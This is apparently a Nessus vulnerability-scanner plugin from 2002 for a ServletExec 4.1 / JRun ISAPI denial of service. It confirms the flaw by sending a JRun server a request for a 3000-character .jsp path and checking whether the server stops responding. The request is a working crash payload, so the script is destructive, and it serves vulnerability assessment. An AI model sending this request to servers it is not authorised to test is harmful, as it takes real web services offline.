#
# This script was written by Matt Moore <matt.moore@westpoint.ltd.uk>
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Wrong BugtraqID(6122). Changed to BID:4796. Added CAN.
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10958);
 script_bugtraq_id(1570, 4796);
 script_cve_id("CVE-2002-0894", "CVE-2000-0681");
 script_version ("$Revision: 1.12 $");
 name["english"] = "ServletExec 4.1 / JRun ISAPI DoS";
 name["francais"] = "ServletExec 4.1 / JRun ISAPI DoS";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
By sending an overly long request for a .jsp file it is 
possible to crash the remote web server.

This problem is known as the ServletExec / JRun ISAPI DoS.

Solution for ServletExec: 
Download patch #9 from ftp://ftp.newatlanta.com/public/4_1/patches/

References: 

www.westpoint.ltd.uk/advisories/wp-02-0006.txt
http://online.securityfocus.com/bid/6122

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Tests for ServletExec 4.1 ISAPI DoS";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2002 Matt Moore",
		francais:"Ce script est Copyright (C) 2002 Matt Moore");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl", "www_too_long_url.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("www/too_long_url_crash");
 exit(0);
}

# Check starts here

include("http_func.inc");
crashes_already = get_kb_item("www/too_long_url_crash");
if(crashes_already)exit(0);

port = get_http_port(default:80);

if(get_port_state(port))
{ 
 banner = get_http_banner(port:port);
 if ( ! banner ) exit(0);
 if ( "JRun" >!<  banner ) exit(0);
 
 buff = string("/", crap(3000), ".jsp");

 req = http_get(item:buff, port:port);
	      
 soc = http_open_socket(port);
 if(soc)
 {
 send(socket:soc, data:req);
 r = http_recv(socket:soc);
 if (!r)
	security_hole(port);
 
 }
}

